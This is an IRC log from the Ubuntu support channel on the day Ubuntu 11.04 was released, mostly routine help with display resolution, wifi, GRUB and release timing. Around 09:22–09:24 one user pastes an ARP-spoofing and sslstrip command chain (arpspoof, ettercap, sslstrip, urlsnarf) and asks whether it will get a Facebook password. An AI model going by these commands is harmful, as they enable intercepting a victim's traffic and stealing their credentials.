@@ -1,0 +1,511 @@
+[08:43] <vibhav> <sobersabre> Install Startup Manager from UBuntu Software Center
+[08:44] <EbanSoul> Is Unity still going to be the default for 11.04 or have they moved to KDE ?
+[08:44] <smw> sobersabre, yes
+[08:44] <sobersabre> soreau: preferences->monitors doesn't hold in console :)
+[08:44] <proq> what is unity?
+[08:44] <vibhav> <EbanSoul> no they are using Unity
+[08:44] <soreau> sobersabre: Right, I misunderstood you in the first place
+[08:44] <sobersabre> proq: in what context.
+[08:44] <horse_play> smw, K_45 ok thanks
+[08:44] <smw> soreau, yours looked better anyways
+[08:44] <smw> soreau, much better than a random 3 digit number
+[08:44] <proq> sobersabre: you don't see the context?
+[08:44] <soreau> sobersabre: Basically what you're seeing is when the intel module is loaded with kms
+[08:45] <proq> sobersabre: <EbanSoul> Is Unity still going to be the default for 11.04 or have they moved to KDE?
+[08:45] <smw> proq, lmao
+[08:45] <vibhav> proq : Unity is a shell interface for the GNOME desktop environment developed by Canonical Ltd for its Ubuntu operating system
+[08:45] <DirtyDawg> i heard that X is to be replaced by Wayland, is that right?
+[08:45] <soreau> sobersabre: For example you would use something like this as a kernel param: video=VGA-1:800x600
+[08:45] <K_45> @ DirtyDawg, eventually
+[08:45] <DirtyDawg> :o
+[08:45] <proq> vibhav: a shell interface - do you mean a terminal emulator?
+[08:45] <smw> DirtyDawg, one day. X must die
+[08:46] <DirtyDawg> :(
+[08:46] <soreau> sobersabre: But the name VGA-1 may be different
+[08:46] <sobersabre> proq: unity is a new (I'm not sure which:) desktop or windows manager.
+[08:46] <vibhav> <sobersabre> You can use Startup Manger to Change your resolution?
+[08:46] <K_45> @ smv - legacy needs to go
+[08:46] <vibhav> proq : its not a terminal emulator
+[08:46] <sobersabre> soreau: I don't know where does VGA-1 come from.
+[08:46] <vibhav> <sobersabre> I know an easier method to do that
+[08:47] <sobersabre> vibhav: to do what ?
+[08:47] <vibhav> <sobersabre> To change the resolution
+[08:47] <sobersabre> and what do you mean "easier" it is easy anyway: edit a text file, and run update-grub.
+[08:47] <vibhav> <sobersabre> there is a progrma for that too
+[08:47] <sobersabre> vibhav: to change reso of console ?
+[08:47] <soreau> sobersabre: I'm trying to find it now..
+[08:47] <sobersabre> soreau: hint would be nice :)
+[08:48] <vibhav> <sobersabre> there is a progrmam for that too (to change resolution of grub)
+[08:48] <sobersabre> I like your eagerness to help. initially I thought you're not listening.
+[08:48] <sobersabre> my bad.
+[08:48] <josephoenix> Should a VPS install grup? I did apt-get upgrade and it tried to install grub
+[08:48] <sobersabre> vibhav: not resolution of GRUB
+[08:48] <josephoenix> I didn't think grub was installed before.
+[08:48] <sobersabre> of console.
+[08:48] <josephoenix> *grub
+[08:48] <sobersabre> vibhav: ok ?
+[08:48] <vibhav> <sobersabre>  Ok
+[08:48] <llutz_> josephoenix: usually no need for a boot-manager on a vps
+[08:49] <sobersabre> vibhav: what irc client are you using? (I know I can /whois you, I prefer asking)
+=== quick_nick_ is now known as quick_nick
+[08:50] <vibhav> <sobersabre> I use Xchat
+[08:50] <Zavior> has anyone seen this before? "(initramfs) Can not mount /dev/loop0 (/cdrom/casper/filesystem.squashfs) on //filesystem.squashfs"
+[08:50] <vibhav> <sobersabre> refer to http://superuser.com/questions/66428/how-can-i-change-console-shells-resolution-in-ubuntu-9-10
+[08:51] <sobersabre> vibhav: what irc client are you using? (I know I can /whois you, I prefer asking)
+[08:51] <sobersabre> hell, I got lagged over ssh.
+[08:51] <vibhav> <sobersabre> I use Xchat as my IRC Client
+[08:51] <crackguy> how can i reinstall iscsi-initiator-utils package on Citrix XenServer 5.6?
+[08:51] <K_45> Zaviour - http://ubuntuforums.org/showthread.php?t=1588547
+[08:51] <vibhav> <sobersabre> Why do you ask?
+[08:51] <iceroot> crackguy: ask citrix
+[08:51] <phoque_uni> so... once 11.04 is out... how do I change back to Gnome 2? ;-)
+[08:52] <sobersabre> vibhav: b/c all the people append NICK:, and yours appends <NICK>
+[08:52] <K_45> @ phoque_uni - Switch to Debian
+[08:52] <DirtyDawg>  i am thinking of using the new Gnome 3
+[08:52] <sobersabre> my client colors lines with  NICK:
+[08:52] <phoque_uni> K_45, hah
+[08:52] <vibhav> <phoque_uni> in the login session chose Ubuntu Classic Session
+[08:52] <sobersabre> so I know when somebody is writing to me. on the chan
+[08:52] <K_45> @ phoque_uni - nothing like a stable netinst
+[08:52] <GReeNtooTH> Could anyone please tell me how to open a port in ubuntu?
+[08:52] <llutz_> phoque_uni: learn to use the session-menu from gdm
+[08:52] <vibhav> <sobersabre> ok
+[08:52] <phoque_uni> vibhav, ah cool... so they thought of that. thanks
+[08:52] <phoque_uni> :-)
+[08:53] <vibhav> <phoque_uni> You are welcome
+[08:53] <iceroot> GReeNtooTH: just start the program, it will open the port automaticly
+[08:53] <sobersabre> vibhav: capisci ?
+[08:53] <vibhav> <GReeNtooTH> sudo iptables -A INPUT -p tcp --dport (port number) -j ACCEPT
+[08:54] <GReeNtooTH> thanx iceroot
+[08:54] <elex> hi
+[08:54] <GReeNtooTH> and vibhav
+[08:54] <vibhav> <sobersabre> what do you mean by "capisci"
+[08:54] <DirtyDawg> it means "understand" i think
+[08:54] <vibhav> <sobersabre> what do you mean by "capisci"
+=== debd is now known as damno
+[08:55] <proq> phoque_uni: you would apt-get install it I suppose
+[08:55] <proq> phoque_uni: just a wild guess
+[08:55] <damno> i cant set eth1 as default for ntop
+[08:57] <damiano> hello
+[08:57] <damno> damiano: hi
+[08:57] <damiano> hi damno
+[08:57] <damiano> i have a strange problem...
+[08:57] <EbanSoul> #ubuntu-us-ky
+[08:57] <damno> damiano: tell
+=== lance_ is now known as Guest7653
+[08:58] <damiano> i'm tring to stop php-fpm with /etc/init.d/php5-fpm stop
+[08:58] <Barbarabush> [09:57] <ubottu> Sorry, I don't know anything about wank
+[08:58] <damiano> but i always see the processes doing ps aux
+[08:58] <damiano> could someone help me?
+[08:59] <soreau> sobersabre: I cant seem to find it right now but you have to cat something in /proc IIRC..
+[09:00] <kichawa> how about new ubuntu release ?
+[09:01] <jiltdil> i by mistake removed my menu pannel , how to get it back
+[09:01] <starlatch> Anyone know if we can upgrade from 10.04 to 11.04?
+[09:02] <kichawa> starlatch: you can do that
+[09:03] <starlatch> kichawa: Thanks. I am assuming it does not involve going through 10.10 first.
+[09:03] <getex> hi
+[09:03] <getex> anybody from argentina
+[09:03] <getex> ?
+[09:03] <DirtyDawg> jiltdil: have you tried to right click and add it back
+[09:04] <DirtyDawg> "add to panel"
+[09:04] <DirtyDawg> menu / main menu
+[09:04] <jiltdil> DirtyDawg:right clicking is not giving option for it
+[09:04] <RKyle> is it possible to change the owner of a file in /var/www/ for non-admin users to access? I tried sudo chown username -R path but that didn't work
+[09:07] <phoque_uni> RKyle, what file, what user and what did that command yield?
+[09:07] <jiltdil> DirtyDawg:hi this worked firdtly i think it will not going to work but it worked gconftool --recursive-unset /apps/panel && killall gnome-panel
+[09:08] <RKyle> phoque_uni, I had a directory in /var/www/ I was trying to give access to a non-admin user and the command displayed nothing like it worked
+[09:09] <herc_> hi
+[09:09] <herc_> when is the ubuntu 11.04 becomeing available for download?
+[09:09] <llutz_> herc_: when its done
+[09:10] <guest345345> gimme gimme gimme
+[09:10]  * ugisozols gives
+[09:10] <herc_> llutz_: wasn't it suposed do be done today?
+[09:11] <llutz_> herc_: yes, "today" still lasts a few hours
+[09:11] <guest345345> Yeah...there are still 15 hours left "today"
+[09:11] <Zavior> this error is kicking my butt, cannot install ubuntu :(
+[09:11] <herc_> do you know when will it be done?
+[09:11] <DarkEra> it will be released somewhere today, be patient
+[09:11] <celthunder> Zavior: what's the error
+[09:11] <amphibgiraffe> Depends on your timezone.
+[09:11] <Zavior> celthunder: (initramfs) Can not mount /dev/loop0 (/cdrom/casper/filesystem.squashfs) on //filesystem.squashfs"
+[09:11] <herc_> CET
+[09:11] <guest345345> Last release was quite early in the day
+[09:12] <guest345345> if your close to UTC that is
+[09:12] <ManDay> lol
+[09:12] <ManDay> my cristal ball told me what to expect in #ubuntu
+[09:12] <ManDay> it seems it was right
+[09:13] <guest345345> You don't need a crystal ball to expect abounding inpatience
+[09:13] <herc_> when can I expect it?
+[09:13] <celthunder> herc_: within the next 23 hours
+[09:13] <llutz_> ManDay: same thing twice a year
+[09:13] <herc_> celthunder: thank you very much
+[09:13] <vadviktor> :) so true :)
+[09:13] <herc_> (:
+[09:13] <ManDay> llutz_: wanan make a bet how long the server holds out?
+[09:13] <guest345345> probably more like within the next 10 hours to be honest
+[09:13] <Alexan> Hi all
+[09:13] <herc_> about 15 minutes
+[09:14] <guest345345> probably less
+[09:14] <ManDay> 5 minutes
+[09:14] <ManDay> thats the time it takes for the word to spread
+=== Alexan is now known as alexannn
+[09:14] <vadviktor> I'm a bit impatient too, because tonight I have to install a Ubuntu on a friend's netbook to replace 9.10 and I really hope it will be 11.04 :)
+[09:15] <DamienCassou> vadviktor: I would install latest daily if I were you
+[09:15] <amphibgiraffe> vadviktor: I'm using the beta, seems to work fine
+[09:16] <DamienCassou> vadviktor: because latest daily is probably very close (or even similar) to the next release
+[09:16] <ManDay> DamienCassou: latest daily, thats new to me, too - what is that?
+[09:16] <DamienCassou> ManDay: http://cdimage.ubuntu.com/daily/current/?C=N;O=A
+[09:16] <guest345345> just the daily build on CD
+[09:16] <vadviktor> it'll be that one and upgraded as needed if the images won't come out untill then :)
+[09:16] <mick_laptop> anyone know how to tell casper to start an app on start?
+[09:16] <ManDay> from vcs ?
+[09:16] <JR0cket1> There havent been many updates in the last 24 hours - only the timezone package - so I guess I am now running 11.04
+[09:16] <DamienCassou> ManDay: latest daily are iso files that are created every day
+[09:16] <ManDay> DamienCassou: from vcs?
+[09:16] <mick_laptop> i tried a few things like an entry in .xsessionrc in /etc/skel
+[09:16] <guest345345> Yeah from VCS
+[09:17] <mick_laptop> so far nothing :(
+[09:17] <DamienCassou> ManDay: what is VCS ?
+[09:17] <ManDay> something like svn cvs or git
+[09:17] <guest345345> Im assuming he means Version Control
+[09:17] <ManDay> versioning control
+[09:17] <guest345345> all packaged are managed by LP/BZR
+[09:17] <vadviktor> Version Control System
+[09:17] <guest345345> so yes...its from VCS
+[09:17] <ManDay> ah well bzr
+[09:17] <ManDay> i forgot :P
+[09:17] <MaRk-I> mick_laptop: System > Preferences > Startup Applications
+[09:17] <DamienCassou> guest345345: that was also my guess, but didn't find the link
+=== ph0x is now known as ph0x09
+[09:19] <guest345345> How many people are using Emapthy for IRC here?
+[09:19] <Manohar> Hello
+[09:19] <celthunder> guest345345: hopefully 0
+[09:19] <guest345345> lol
+[09:19] <mick_laptop> MaRk-I: i'm working on a remixed cd
+[09:19] <guest345345> well I am
+[09:19] <Manohar> do someone know how to get 11.04 final release?
+[09:19] <guest345345> It sucks but I loe the integration
+[09:19] <Zavior> Guess I'll give this minimal CD install a shot
+[09:19] <Nelval> Hi
+[09:19] <guest345345> love*
+[09:19] <dreinull_> wheres the place to look for the release?
+[09:19] <mick_laptop> so i'm dealing w/ casper directly
+[09:19] <MaRk-I> mick_laptop: ah no idea then
+[09:20] <guest345345> Anyone know how to hack Empathy to support SASL auth?
+[09:20] <vibhav> I hate Samoa!
+[09:20] <amphibgiraffe> Manohar: Wait.
+[09:21]  * kichawa are waiting
+[09:21]  * vibhav is waiting
+[09:21]  * vibhav is waiting LIKE MAD!!
+[09:22] <Manohar> I found this: http://cdimage.ubuntu.com/daily-live/current/
+[09:22] <newbie28> anyone know anything about getting wifi to work on 10.10
+[09:22] <GReeNtooTH> Will these commands get me a facebook password?
+[09:22] <DamienCassou> Manohar: this is what I would use
+[09:22] <celthunder> newbie28: what's your wifi chipset
+[09:22] <GReeNtooTH> echo "1" > /proc/sys/net/ipv4/ip_forward
+[09:22] <Manohar> http://cdimage.ubuntu.com/daily-live/current/
+[09:22] <Manohar> is it the final release?
+[09:22] <vibhav> Is the Oversized CD Bug fixed????
+[09:23] <soreau> sobersabre: Ok I found it
+[09:23] <cgq> it's the first i use ubuntu
+[09:23] <vibhav> Manohar : No its the daily build
+[09:23] <GReeNtooTH> iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 8080 -j REDIRECT --to-port 8080
+[09:23] <pidh> i ubuntu in a virtual box - VBoxGuestAdditions is installed but still the max resolution i can select is 800x600
+[09:23] <mick_laptop> what does "source" do? (no manpage), I know it doesn't execute a file... but something like that?
+[09:23] <JR0cket1> @vibhav - installing from a USB stick is much faster than CD..
+[09:23] <vibhav> @JE0cket1 I know
+[09:23] <pidh> any suggestiongs how to increase it?
+[09:23] <DamienCassou> mick_laptop: help source
+[09:23] <amphibgiraffe> mick_laptop: In bash?
+[09:23] <GReeNtooTH> arpspoof -i wlan0 -t (Vic IP) (DG)
+[09:23] <Manohar> what's the difference? when will the final be released?
+[09:24] <GReeNtooTH> ettercap -TqM ARP:REMOTE // // -i wlan0
+[09:24] <soreau> sobersabre: ls /sys/class/drm/ and use these to make a kernel line video=VGA-1:1024x768 for example
+[09:24] <GReeNtooTH> sslstrip -a -l 8080
+[09:24] <cgq> i can't hear vioce.anybody help me please
+[09:24] <andeeeuk> Manohar: the final release is out today
+[09:24] <GReeNtooTH> urlsnarf -i wlan0 |cut -d\" -f4
+[09:24] <Incarus6> pidh, interesting, but i think it isnt related with vboxguestadditions. can you poste your Xorg.0.log client file
+[09:25] <andeeeuk> Manohar: though on the website it is still seen as in development
+[09:25] <llutz_> GReeNtooTH: take it to #1338-hackers please, its offtopic here
+[09:25] <pdg1> GReeNtooTH : why don't you use something like pastebin
+[09:25] <pdg1> that 2
+=== lance is now known as Guest79252
+[09:25] <GReeNtooTH> ok llutz is it on here
+[09:26] <newbie28> celthunder : chip set = AR9285
+[09:26] <key213> so the new ubu comes out ..?
+[09:26] <guest345345> everyone needs to put their epeen back in the trouders now
+[09:26] <Manohar> andeeeuk: do you know where to find the final relesae?
+[09:26] <guest345345> trousers(/pants)*
+[09:26] <alexander__> Help! No Ubuntu 11.04 final
+[09:26] <alexander__> waiting it for 2 months
+[09:26] <guest345345> Solution: WAIT!
+[09:26] <vibhav> <Manohar> IF you are Indian , it will be there by evening.....
+[09:26] <MACscr> anyone know how to upgrade chromium on ubuntu 10.10 to chromium 11? I would think there would be a ppa for this and im not sure why the current ppa hasnt been upgraded yet
+[09:26] <celthunder> newbie28: ok
+[09:27] <guest345345> Canonical HQ is GMT+1 now
+[09:27] <vadviktor> Anyone can confirm that the basic 11.04 will be good for a Asus eeepc?
+[09:27] <guest345345> they have barely woken up yet
+[09:27] <Manohar> I'm indian but live in switzerland
+[09:27] <Incarus6> alexander__, mention, that ubuntu will be released during the day
+[09:27] <andeeeuk> Manohar: I am not sure as the website says it is still in development so i think we will need to wait until they have uploaded the new 11.04
+[09:27] <celthunder> newbie28: ath9k module should work fine
+[09:27] <guest345345> vadviktor, yes....it will be amazing
+[09:27] <Incarus6> andeeeuk, correct, will be released today
+[09:27] <Manohar> yep, the only solution is to wait then..
+[09:27] <newbie28> celthunder: i keep getting "bad password"
+[09:28] <amphibgiraffe> vadviktor: They've merged netbook remix and desktop, so one assumes so
+[09:28] <vibhav> <MACscr> If you are in hurry, the exact same packages are already available in the Stable Channel PPA as usual, for Hardy, Karmic, Lucid, Maverick and Natty. You can safely subscribe to this PPA and later receive the official builds with your regular system upgrades.
+[09:28] <mah454> when ubuntu out new version ?
+[09:28] <Pr070cal> whens natty released ?
+[09:28] <mah454> when ubuntu out new version ?
+[09:28] <pidh> Incarus6: http://pastie.org/1842573 - is it the right log
+[09:28] <celthunder> newbie28: ? so type in the right one
+[09:28] <MACscr> vibhav: stable channel ppa?
+[09:28] <newbie28> celthunder: lol it is the right one
+[09:28] <guest345345> ATTENTION INPATIENT PEOPLE: The time at Canonical HQ is now 9:28.......give them chance to wake up and get to the office before you complain or ask where 11.04 is!!
+[09:29] <andeeeuk> Incarus6, thanks just wanted to make sure as I was going to update this morning though we will have to wait some time for the release
+[09:29] <vadviktor> amphibgiraffe, guest345345: thanks! :)
+[09:29] <alexander__> Incarus6: When? I'm located in Italy (10:29 AM)
+[09:29] <Incarus6> MACscr, chromium in the repos is a modified version of the original google sources. better wait for updates from ubuntu, they modified some privacy things
+=== guido is now known as Guest14603
+[09:29] <newbie28> celthunder: im using Wicd network mang.
+[09:29] <celthunder> newbie28: did you pick the right network security type
+[09:29] <guest345345> Incarus6: where have you read that?
+[09:30] <guest345345> Incarus6: is that just hearsay or does it have some basis?
+[09:30] <newbie28> celthunder: yup and have triple checked on both ends
+[09:30] <Rehan> hi guys, i had a question. I'm running 10.10 right now and am wondering if there's any difference in system stability whether I install 11.04 brand new or just do an upgrade
+[09:30] <newbie28> celthunder: i tried changing to a new password as well still did the same thing
+[09:30] <guest345345> Technically you can dist-upgrade but it's usually better and cleaner to fresh install
+[09:30] <guest345345> @Rehan
+[09:31] <Aleksander> Hello :) How much time is it till the 11.04?
+[09:31] <guest345345> A few hours
+[09:31] <Incarus6> alexander__, usually I (from Germany) can upgrade around afternoon
+[09:31] <celthunder> newbie28: do you have wpa_supplicant installed (you should but...never hurts to double check)
+[09:31] <vadviktor> If I use the update manager as "update-manager -d" I can upgrade to 11.04. Is this correct? Should I continue as it is the stable one?
+[09:31] <MACscr> Incarus6: but isnt 11 the current stable release?
+[09:31] <Aleksander> thanks
+[09:31] <guest345345> vadviktor: yes...that's right....but not yet
+[09:31] <alexander__> Incarus6: I want clean install
+[09:31] <Incarus6> guest345345, it is mentioned in the user guide
+[09:31] <Rehan> guest345345: thanks...is there a way to backup the current system i have?
+[09:31] <guest345345> vadviktor: or you can do: sudo apt-get update && sudo apt-get dist-upgrade
+[09:32] <newbie28> celthunder:  yup its there
+[09:32] <vadviktor> guest345345: what do you been by not yet? :)
+[09:32] <guest345345> Rehan: What do you need to back-up?
+[09:32] <llutz_> guest345345: that won't change the version unless you changed your sources.list(s)
+[09:32] <Incarus6> MACscr, it is, but usually you do not get the never version of a software, you get security updates (its like FF4, which wasnt released in 10.10)
+[09:32] <Nelval> it seems that today it is the 28th of April 2011
+[09:32] <guest345345> Rehan: personally, I have a script for configuting every new system in Install automatically
+[09:32] <Rehan> guest345345: i don't know, i was wondering if there's a way i could just make a snapshot of my current system in case the new version doesn't work for me
+[09:33] <Incarus6> alexander__, same, they are going to upload it around that time
+[09:33] <guest345345> Rehan: You can just copy your /home directory but it's not very clean
+[09:33] <MACscr> Incarus6: what is this, Centos? =P
+[09:33] <guest345345> Rehan: I see no reason why it wouldn't work.....I've been testing since alpha and it's very stable now
+[09:33] <Incarus6> MACsrc, we are both talking about ubuntu, right?
+[09:33] <MACscr> Incarus6: yes, i was making a joke about updates
+[09:34] <JR0cket1> Rehan: try it out using the Live image first and see if you like it and it all works...
+[09:34] <Rehan> guest345345: well 10.10 is considered stable but it was a pain in the ass to get working properly on my sony laptop
+[09:34] <vadviktor> guest345345: I see now, it is still the beta as stated in it's note
+[09:34] <guest345345> Rehan: yeah, what JR0cket1 said
+[09:34] <Incarus6> MACsrc, im not sure if chromium 11 will be released in 11.04
+[09:34] <Rehan> JR0cket1: the liveCD doesn't work well for me, the 10.10 liveCD made it seem as if ubuntu wouldn't run on my machine at all
+[09:34] <newbie28> celthunder:  any ideas on how to fix it?
+[09:35] <elzoog> Any idea how many hours we have until they release 11.04?
+[09:35] <guest345345> Rehan: that is probably because of restricted drivers....you can still install them and try to in the Live environment
+[09:35] <smw> elzoog, "Ubuntu 11.04 release is scheduled somewhere in the time period when it's April 28th somewhere in the world, not at a specific time."
+[09:35] <guest345345> Rehan: and 11.04 has improved a fair bit on the drivers front
+[09:35] <Rehan> JR0cket1, guest345345: i had to change video, network and other drivers just to get it to work. I didn't know it was possible to install drivers with a LiveCD?
+[09:35] <elzoog> Well, where I am located, it's 5:35 in the afternoon on the 28th
+[09:36] <Incarus6> pidh, it could have something to do with your vbox settings
+[09:36] <vadviktor> Another Asus eepc question: which architecture image should I get, the x86 or the x64 one?
+[09:36] <guest345345> elzoog: Unluck....because the work day has barely started at Canonical HQ
+[09:36] <guest345345> Unlucky*
+[09:36] <popey> vadviktor: depends which eee pc
+[09:36] <Rehan> elzoog: what time zone are you in
+[09:36] <msb___> i am going to install the daily built (26 April). cannot see them adding too much more release
+[09:36] <matto1990> anyone know what ATI video support is like in natty?
+[09:36] <elzoog> I live in Korea
+[09:36] <Nelval> elzoog, aw
+[09:36] <andeeeuk> yay, its finally been released on the website :)
+[09:36] <guest345345> vadviktor: if you're on an atom....x86
+[09:36] <JR0cket1> Rehan: If you need to add a lot of packages, install Ubuntu onto a usb stick rather than your hard drive and then you can install what you want without issue
+[09:36] <Incarus6> pidh, did you modify your xorg.conf file?
+[09:36] <Nelval> 10:36 AM in France, it's so long
+[09:37] <Rehan> elzoog: GMT+ ?
+[09:37] <andeeeuk> good stuff:)
+[09:37] <Rehan> anyone know what time GMT the new version is coming out?
+[09:37] <guest345345> http://www.ubuntu.com/
+[09:37] <Incarus6> andeeeuk, sure?
+[09:37] <vadviktor> guest345345: thanks, that is the info I was not aware of
+[09:37] <DJones> Rehan: No set time, just anytime in the next 15 hours
+[09:37] <asdfppf> yeah, gmt time for ubuntu 11.04 would be nice
+=== lance_ is now known as Guest20282
+[09:37] <Rehan> oh i see, thanks Djones
+[09:38] <mavis> 英语不行，别鄙视
+[09:38] <elzoog> I made the mistake of installing Ubuntu Studio on my desktop.  It's buggy.  But I am waiting for 11.04 instead of installing the normal 10.10
+[09:38] <Incarus6> !ch | mavis
+[09:38] <ubottu> mavis: Das Schweizer Team finden sie unter #ubuntu-ch, deutschsprachigen Support bekommen sie aber in #ubuntu-de, #kubuntu-de oder #edubuntu-de. Aus regionalen Gründen ist im Schweizer Channel nur Englisch erlaubt. Geben sie einfach /join #ubuntu-at ein! Danke für ihr Verständnis.
+[09:38] <Incarus6> damn
+[09:38] <JR0cket1> Rehan: a good 4 GB Usb memory still will run Ubuntu 11.04 well for testing your hardware and save you over-writing you current system
+[09:38] <pidh> Incarus6: i enabled the 3d capabilities will disable them, and i did try to add a new video mode before installing the guest addon and because of that it may look different
+[09:39] <guest345345> You can just dual boot to try it if you are worried a LiveUSB will skew the experience too much
+[09:39] <Rehan> JR0cket1: oh ok, thats a good idea. I tried creating a bootable usb for 10.10 but kept getting "boot error' on startup
+[09:39] <guest345345> and then overwrite both when you're ready to upgrade for real
+[09:39] <andeeeuk> no, not yet. If it is not released yet we will wait and waiting is a good thing isnt it so we know it is all good
+[09:39] <mavis> learn
+[09:39] <elzoog> JR0cket1:  I have 11.04 on one of my sticks.  If I install stuff on it, and then install it on my HD, will it also install the added software?
+[09:39] <newbie28> anyone know how to get wifi working on 10.10 i keep getting "bad password" im using Wicd Manager
+[09:40] <Incarus6> pidh, did you correctly set your corg.conf file?
+[09:40] <soreau> newbie28: What wifi chip is it?
+[09:40] <newbie28> soreau : chip set = AR9285
+[09:40] <soreau> newbie28: What encryption type?
+[09:40] <guest345345> fire up "jockey-gtk" and see if it's offering any resitrcted drivers
+[09:40] <Incarus6> MACsrc, https://launchpad.net/~chromium-daily/+archive/stable
+[09:40] <newbie28> soreau : wpa
+[09:41] <soreau> newbie28: Is there any reason you arent using nm-applet?
+[09:41] <newbie28> soreau : dno what that is im new to this
+[09:41] <soreau> newbie28: Which version of ubuntu?
+[09:41] <newbie28> soreau : 10.10
+[09:41] <matto1990> time of release is after noon GMT+1 according to a canonical employee: http://bettween.com/matto1990/yaili
+[09:42] <soreau> newbie28: nm-applet is the default network management applet that appears in gnome-panel
+[09:42] <guest345345> matto1990: yeah that sounds about same as last time
+[09:42] <Rehan> could someone explain to a complete newbie like me whether I should use ubuntu or kubuntu? I don't get the difference really...
+[09:42] <guest345345> just after they eat lunch lol
+[09:42] <alexander__> Incarus6: Thanks!
+[09:42] <guest345345> Rehan: Use Ubuntu
+[09:43] <newbie28> soreau : ohh ya i started with that and it wouldnt even connect to the network so ive googled it and did some whole thing that got me to the "Wicd" but now it says "bad password" each time
+[09:43] <jatt> use kubuntu
+[09:43] <soreau> Rehan: ubuntu has gnome by default and kubuntu has kde by default
+[09:43] <guest345345> Rehan: Kubuntu is horrifically ugly
+[09:43] <egolost> how do i add an custom installed (not using apitiude) application to unity sidebar?
+[09:43] <jatt> at least it doesn't run unity per default
+[09:43] <velcroshooz> Rehan, personal preference. ubuntu uses the gnome desktop enviroment by default, kubuntu uses KDE.
+[09:43] <jatt> xubuntu
+[09:43] <Incarus6> Rehan, Kubuntu is unbuntu with the more like windows looking KDE desktop. Ubuntu uses gnome
+[09:43] <pidh> Incarus6: there is no corg.conf in /etc/X11
+[09:43] <soreau> Rehan: The official ubuntu distro uses gnome, if that tells you anything..
+[09:44] <j0shdrunk0nwar> Rehan: try both with live cd
+[09:44] <sobersabre> vib	when you write - I need to hunt your messages /window list
+[09:44] <Incarus6> pidh, I know, you have to create one
+[09:44] <Zavior> yay I think I'm getting Ubuntu to finally install :) !
+[09:44] <guest345345> Yeah...KDE stack is built on better technology......but it's naming conventions are annoying and it's full of BLOAT
+[09:44] <JR0cket1> elzoog: If you install Ubuntu on a Usb stick, then it wont have the installer packages - you could add them, but I personally would do a reinstall and perhaps grab the package list off the usb stick and take a copy of everything in /etc
+[09:44] <stefan__1> egolost: Start Application --> right click and select, that the application always show up
+[09:44] <Zahrada> At least till the release of 11.04 later this day, it uses gnome :P
+[09:44] <Zavior> Anyone know the version of python that comes with Ubuntu, or actually...if python does come included?
+[09:44] <egolost> stefan__1: but how do i get my application to show up in start applications?
+[09:45] <newbie28> soreau : should i switch back?? if so how the heck do i do that lol
+[09:45] <Zavior> 10.10
+[09:45] <guest345345> Zavior: 2.7
+[09:45] <Zavior> thanks
+[09:45] <soreau> newbie28: I guess you would have to undo whatever you did to switch in the first place
+[09:45] <stefan__1> egolost: You mean at the unity applications menu?
+[09:45] <Rehan> if I didn't create a swap partition when i installed 10.10 (i have two partitions on the laptop drive but one is for win7), does that mean I can't hibernate the system?
+[09:45] <guest345345> Zavior: np
+[09:45] <egolost> stefan__1: YES
+[09:45] <Bilz> hello, im trying to follow this to set up vnc: https://help.ubuntu.com/community/VNC#Guide%20to%20example%20scenarios and I'm currently on a windows machine using putty. I have sshed to my home computer but I don't know how to get the public key which I apparently need to add to a file
+[09:45] <stefan__1> echolost: alternativly try to start the app over a terminal
+[09:45] <velcroshooz> Rehan, yes.
+[09:46] <Rehan> velcroshooz: oh i see. I should still be able to suspend though right?
+[09:46] <guest345345> Zavior: actually I just checked....11.04 is running 2.7.1
+[09:46] <pidh> Incarus6: any pointer to a guide how to create it - i am new to linux and have no coding skills.
+[09:46] <stefan__1> egolost: otherwise you can start the menu ?reorganization? with a command, which I actually don't know --> if you need the app in the unity menu
+[09:47] <tomtit> morning all
+[09:47] <kichawa> \o
+[09:47] <velcroshooz> Rehan, as i understand it, i believe so. hibernate is going to require a swap partition equal to or possible a bit more than your ram size.
+[09:48] <Rehan> velcroshooz: ok cool
+[09:48] <guest345345> velcroshooz: that's not necessarily true....it only needs to be as big as resident memory...not total memory
+[09:48] <mavis> anybody here?
+[09:48] <guest345345> or the average you generally use anyway
+[09:48] <Rehan> trying to figure out why no matter what i try my laptop won't suspend/standby. Well actually it will suspend but when i try to turn it back on it boots up just like a cold boot
+[09:49] <guest345345> Rehan: a default install allocates 1:1 memory:swap
+[09:49] <guest345345> so unless you used custom partitions it should be enough
+[09:49] <guest345345> or unless you added more memory since
+[09:49] <Rehan> guest345345: i already had a 10gb partition made for ubuntu and i just installed ubuntu onto that.
+[09:50] <arnauddebordeaux> clear
+[09:50] <guest345345> oh...well that is not default then
+[09:50] <Zavior> any down sides to encrypting the home directory?
+[09:50] <arnauddebordeaux> hello all!
+[09:50] <velcroshooz> guest345345, as your use can fluctuate though i think most tutorials suggest a size equal to your ram to be on the safe side.
+[09:50] <arnauddebordeaux> need emergecny help!
+[09:50] <guest345345> velcroshooz: yeah....that is optimal if you plan to hibernate
+[09:50] <green_> when is the new release scheduled to happen?
+[09:50] <guest345345> velcroshooz: but not strictly required most of the time
+[09:50] <mythri> I need help. Using Ubuntu 10.10. I have recovered my files through Windows and have only retrieved a single file Root.disk. Can anyone help?
+[09:51] <guest345345> tutorials are generally aimed at people who prefer not to think much
+[09:51] <soreau> arnauddebordeaux: Dial 911 or whatever the emergency hotline is in your country
+[09:51] <mavis> beiju
+[09:51] <arnauddebordeaux> sorry, soreau?
+[09:51] <guest345345> and the easiest way to encapsulate anyone is to just play safe
+[09:51] <guest345345> everyone*
+[09:51] <Incarus6> pidh, sry, I was afk. try to change resolution with "xrandr --output VGA1 --mode 1024x768" or similar https://wiki.ubuntu.com/X/Config/Resolution
+[09:51] <Macer> uhm
+[09:51] <Rehan> is making a win7 partition smaller to create space for a new partition (for ubuntu swap) considered a workaround or is it as good as setting up a partition on a clean drive from scratch?
+[09:51] <arnauddebordeaux> i've tried all i know
+[09:51] <mavis> jiu
+[09:52] <guest345345> Rehan: do you really need Win7 for something?
+[09:52] <jatt> games
+[09:52] <arnauddebordeaux> does anyone konw how to use the grub rescue?
+[09:52] <Rehan> guest345345: yeah its way more reliable than ubuntu
+[09:52] <Macer> arnauddebordeaux: might help if you said what the problem was
+[09:52] <Incarus6> Rehan, Is it as good as from a clean drive
+[09:52] <mavis> jiu meiyou huishuo zhongwen de ren zai ?
+[09:52] <soreau> ! grub2 | arnauddebordeaux
+[09:52] <ubottu> arnauddebordeaux: GRUB2 is the default Ubuntu boot manager since 9.10 (Karmic). Lost GRUB after installing Windows? See https://help.ubuntu.com/community/RestoreGrub - For more information and troubleshooting for GRUB2 please refer to https://help.ubuntu.com/community/Grub2 - See !grub1 for releases before Karmic (9.10)
